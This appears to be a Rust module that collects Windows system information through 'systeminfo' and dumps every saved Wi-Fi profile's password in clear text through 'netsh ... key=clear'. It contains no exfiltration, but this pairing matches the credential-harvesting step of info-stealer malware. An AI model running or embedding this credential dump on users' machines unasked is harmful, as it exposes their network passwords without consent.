use std::process::Command;
use std::str;

pub fn get_os_release_date() -> Result<String, String> {
    let output = Command::new("systeminfo")
        .output()
        .map_err(|e| format!("Error executing the command: {}", e))?;

    let stdout = str::from_utf8(&output.stdout)
        .map_err(|e| format!("Error parsing output: {}", e))?;

    for line in stdout.lines() {
        if line.contains("Original Install Date:") {
            return Ok(line.trim_start_matches("Original Install Date:").trim().to_string());
        }
    }

    Err("OS release date not found".to_string())
}

pub fn get_system_info() -> Result<String, String> {
    let output = Command::new("systeminfo")
        .output()
        .map_err(|e| format!("Error executing the command: {}", e))?;

    let stdout = str::from_utf8(&output.stdout)
        .map_err(|e| format!("Error parsing output: {}", e))?;

    Ok(stdout.to_string())
}

pub fn get_wifi_profile_info() -> String {
    let output = Command::new("netsh")
        .args(&["wlan", "show", "profiles"])
        .output()
        .unwrap_or_else(|e| panic!("Failed to execute command: {}", e));

    let output_str = str::from_utf8(&output.stdout)
        .unwrap_or_else(|e| panic!("Failed to parse output: {}", e));
    let lines: Vec<&str> = output_str.lines().collect();

    let mut profile_names = Vec::new();
    for line in lines {
        if line.contains("User profiles") {
            continue;
        }
        if line.contains("All User Profile") {
            let profile_name = line.split(":").nth(1).map(|s| s.trim())
                .unwrap_or("");
            profile_names.push(profile_name);
        }
    }

    let mut wifi_profile_info = String::from("Wi-Fi Profiles:\n");
    for profile_name in profile_names {
        let output = Command::new("netsh")
            .args(&["wlan", "show", "profile", profile_name, "key=clear"])
            .output()
            .unwrap_or_else(|e| panic!("Failed to execute cmd for profile {}: {}", profile_name, e));

        let profile_output = str::from_utf8(&output.stdout)
            .unwrap_or_else(|e| panic!("Failed to parse output for profile {}: {}", profile_name, e));
        wifi_profile_info.push_str(&format!("Profile: {}\n{}\n", profile_name, profile_output));
    }

    wifi_profile_info
}

